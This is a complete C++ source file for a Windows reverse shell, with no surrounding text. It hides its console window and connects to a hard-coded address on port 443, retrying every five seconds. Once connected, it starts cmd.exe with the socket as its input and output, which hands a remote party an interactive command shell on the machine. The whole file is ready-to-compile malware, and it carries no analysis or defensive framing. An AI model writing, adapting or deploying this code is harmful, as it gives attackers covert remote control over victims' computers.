#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

void RunShell(const char* target, int port)
{
	while (true)
	{
		Sleep(5000);
		SOCKET socket;
		sockaddr_in addr;
		WSADATA wsa;

		WSAStartup(MAKEWORD(2, 2), &wsa);
		socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);

		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(target);
		addr.sin_port = htons(port);

		if (WSAConnect(socket, (sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
		{
			closesocket(socket);
			WSACleanup();
			continue;
		}

		char recvData[1024];
		ZeroMemory(recvData, sizeof(recvData));
		int recvCode = recv(socket, recvData, 1024, NULL);

		if (recvCode <= 0)
		{
			closesocket(socket);
			WSACleanup();
			continue;
		}

		char process[] = "cmd.exe";
		STARTUPINFOA sa;
		PROCESS_INFORMATION pi;

		ZeroMemory(&sa, sizeof(sa));
		ZeroMemory(&pi, sizeof(pi));

		sa.cb = sizeof(sa);
		sa.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		sa.hStdInput = sa.hStdOutput = sa.hStdError = (HANDLE)socket;

		CreateProcessA(NULL, process, NULL, NULL, true, 0, NULL, NULL, &sa, &pi);
		WaitForSingleObject(pi.hProcess, INFINITE);

		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);

		ZeroMemory(recvData, sizeof(recvData));
		recvCode = recv(socket, recvData, 1024, NULL);
		if (recvCode <= 0)
		{
			closesocket(socket);
			WSACleanup();
			continue;
		}

		if (strcmp(recvData, "exit"))
		{
			closesocket(socket);
			WSACleanup();
			break;
		}
	}
}

int main()
{
	FreeConsole();
	RunShell("10.0.0.128", 443);

	return 0;
}